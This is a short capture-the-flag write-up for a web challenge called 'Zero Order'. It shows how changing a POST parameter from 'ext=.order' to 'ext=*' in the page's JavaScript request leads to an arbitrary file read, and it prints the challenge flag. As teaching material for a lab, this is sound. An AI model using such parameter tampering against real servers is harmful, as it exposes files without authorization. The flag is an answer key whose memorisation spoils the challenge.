# Zero Order

## Description
```
Such a large company has noticeably low order activity.
Maybe they don't show all the information on the page. 
```

## Writeup

Visiting the website: <br/>
![grafik](https://github.com/Aryt3/writeups/assets/110562298/8be2373d-6f8b-4115-bba6-bf43031142d8)

Taking a look at the javascript code we can see how the request is being made. <br/>
```js
function refreshOrders()
{
var xhr = new XMLHttpRequest();
var url = "index.php";
var params = "ext=.order";

xhr.open("POST", url, true);
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

xhr.onreadystatechange = function() {
    if(xhr.readyState == 4 && xhr.status == 200) {
        document.getElementById("orders").innerHTML=xhr.responseText;
    }
}

xhr.send(params);
}
```

Remembering that the description states that they don't show all the information, I changed the parameters slightly. <br/>
```js
function refreshOrders()
{
var xhr = new XMLHttpRequest();
var url = "index.php";
var params = "ext=*";

xhr.open("POST", url, true);
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

xhr.onreadystatechange = function() {
    if(xhr.readyState == 4 && xhr.status == 200) {
        document.getElementById("orders").innerHTML=xhr.responseText;
    }
}

xhr.send(params);
}
```

Exchanging `.order` with `*` we receive a huge response body and at the bottom the flag `CODEBY{d0_y0u_w4nna_arb1tr4ry_f1l3_r34d?}`. 





